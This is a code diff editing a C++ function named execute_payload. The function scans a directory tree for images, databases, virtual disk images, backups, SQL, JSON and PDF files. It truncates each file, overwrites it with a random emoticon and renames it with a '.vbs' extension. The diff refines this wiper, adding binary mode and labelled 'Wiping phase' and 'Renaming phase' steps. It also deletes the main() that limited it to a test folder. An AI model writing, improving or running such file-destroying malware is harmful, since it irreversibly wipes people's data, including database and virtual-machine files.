@@ -1,19 +1,6 @@
-#include <iostream>
-#include <fstream>
-#include <string>
-#include <filesystem>
-#include <algorithm>
-#include <vector>
-#include <random>
-#include <cctype> // FIX 2: Explicitly included for tolower
-
-namespace fs = std::filesystem;
-using namespace std;
-
 void execute_payload(const string& target_path) {
     vector<string> emoticons = {":3", "OwO", ">w<", "^w^"};
     
-    // FIX 4: Made random engine static so it initializes only once
     static random_device rd; 
     static mt19937 gen(rd());
     uniform_int_distribution<> emo_dist(0, emoticons.size() - 1);
@@ -28,13 +15,10 @@ void execute_payload(const string& target_path) {
             if (!entry.is_regular_file()) continue;
             
             string ext = entry.path().extension().string();
-            
-            // FIX 1: Safe lambda expression to avoid ::tolower template matching issues
             transform(ext.begin(), ext.end(), ext.begin(), [](unsigned char c) { 
                 return tolower(c); 
             });
             
-            // FIX 3: Removed ".vbs" from the target list to avoid redundant checks later
             if (ext == ".jpg"  || ext == ".png"    || ext == ".mdf"     || ext == ".ldf"  || 
                 ext == ".vhdx" || ext == ".vmdk"   || ext == ".parquet" || ext == ".avro" || 
                 ext == ".bak"  || ext == ".sql"    || ext == ".json"    || ext == ".pdf"  || 
@@ -44,34 +28,32 @@ void execute_payload(const string& target_path) {
             }
         }
     } catch (const fs::filesystem_error& e) {
-        // FIX 5: Standardized error logging instead of blind swallowing
         cerr << "Filesystem scanning error: " << e.what() << endl;
+        return;
     }
 
+    // Step 2: Process files safely outside the directory iterator loop
     for (auto& file_path : target_files) {
         string chosen_string = (chance_dist(gen) == 1) ? "X3" : emoticons[emo_dist(gen)];
         
         try {
-            // Explicit block scope releases the file handle immediately
+            // Wiping phase
             {
-                ofstream stream(file_path, ios::trunc);
+                ofstream stream(file_path, ios::binary | ios::trunc);
                 if (stream.is_open()) {
                     stream << chosen_string;
                 }
             } 
 
-            // Double check safety check remains intact
+            // Renaming phase
+            string old_path_str = file_path.string();
+            string new_path_str = old_path_str + ".vbs";
+            
             if (file_path.extension() != ".vbs") { 
-                fs::rename(file_path, file_path.string() + ".vbs"); 
+                fs::rename(old_path_str, new_path_str); 
             }
         } catch (const exception& e) {
             cerr << "Failed to process file " << file_path << ": " << e.what() << endl;
         }
     }
-}
-
-int main() { 
-    // Targets local test directory for execution environment safety
-    execute_payload("./test_folder"); 
-    return 0; 
 }
